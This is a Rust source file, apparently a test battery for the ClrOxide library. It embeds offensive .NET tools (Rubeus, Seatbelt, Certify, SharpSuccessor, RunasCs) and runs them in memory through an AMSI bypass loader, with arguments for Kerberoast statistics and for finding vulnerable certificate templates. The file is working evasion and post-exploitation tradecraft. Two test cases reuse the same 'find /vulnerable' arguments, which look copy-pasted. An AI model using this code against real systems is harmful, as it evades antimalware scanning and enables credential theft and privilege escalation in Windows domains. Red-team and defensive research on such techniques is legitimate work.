use clroxide::clr::Clr;
use clroxide::primitives::AmsiBypassLoader;

static RUBEUS_BYTES: &[u8] = include_bytes!("../assemblies/Rubeus.exe");
static SEATBELT_BYTES: &[u8] = include_bytes!("../assemblies/Seatbelt.exe");
static CERTIFY_BYTES: &[u8] = include_bytes!("../assemblies/Certify.exe");
static SHARPSUCCESSOR_BYTES: &[u8] = include_bytes!("../assemblies/SharpSuccessor.exe");
static RUNASCS_BYTES: &[u8] = include_bytes!("../assemblies/RunasCs.exe");

struct TestCase {
    name: &'static str,
    assembly: &'static [u8],
    args: Vec<String>,
}

fn main() {
    let tests = vec![
        TestCase {
            name: "Rubeus - kerberoast stats",
            assembly: RUBEUS_BYTES,
            args: vec!["kerberoast".into(), "/stats".into()],
        },
        TestCase {
            name: "Seatbelt - user checks",
            assembly: SEATBELT_BYTES,
            args: vec!["-group=user".into()],
        },
        TestCase {
            name: "Certify - find vulnerable templates",
            assembly: CERTIFY_BYTES,
            args: vec!["find".into(), "/vulnerable".into()],
        },
        TestCase {
            name: "SharpSuccessor",
            assembly: SHARPSUCCESSOR_BYTES,
            args: vec!["find".into(), "/vulnerable".into()],
        },
        TestCase {
            name: "RunasCs",
            assembly: RUNASCS_BYTES,
            args: vec!["find".into(), "/vulnerable".into()],
        },
    ];

    println!(
        "[*] ClrOxide - Assembly test battery ({} tests)",
        tests.len()
    );
    println!("[*] All assemblies embedded at compile time, AMSI bypass enabled");
    println!();

    // Single bypass loader for the entire process — the CLR is a singleton,
    // so SetHostControl only works once. All assemblies must be registered
    // in the same loader before the CLR starts.
    let mut bypass_loader = AmsiBypassLoader::new();

    // Register ALL assemblies upfront before starting the CLR
    for test in &tests {
        let clr_tmp = match Clr::new(test.assembly.to_vec(), vec![]) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed to parse '{}': {}", test.name, e);
                continue;
            },
        };
        let identity = match clr_tmp.get_assembly_identity() {
            Ok(id) => id,
            Err(e) => {
                eprintln!("[-] Failed to get identity for '{}': {}", test.name, e);
                continue;
            },
        };
        println!("[+] Registered: {}", identity);
        bypass_loader
            .register_assembly(&identity, test.assembly.to_vec())
            .unwrap();
    }
    println!();

    let mut passed = 0;
    let mut failed = 0;

    for test in &tests {
        println!("================================================================");
        println!("[*] Test: {}", test.name);
        println!("[*] Assembly size: {} bytes", test.assembly.len());
        println!("[*] Args: {:?}", test.args);
        println!("----------------------------------------------------------------");

        let mut clr = match Clr::new(test.assembly.to_vec(), test.args.clone()) {
            Ok(c) => c,
            Err(e) => {
                println!("[-] Error creating CLR: {}", e);
                failed += 1;
                continue;
            },
        };

        match clr.run_with_amsi_bypass_auto(&mut bypass_loader) {
            Ok(output) => {
                println!("{}", output);
                passed += 1;
            },
            Err(e) => {
                println!("[-] Error: {}", e);
                failed += 1;
            },
        }

        println!("[+] Test '{}' done.\n", test.name);
    }

    println!("================================================================");
    println!(
        "[*] Results: {} passed, {} failed, {} total",
        passed,
        failed,
        tests.len()
    );
}
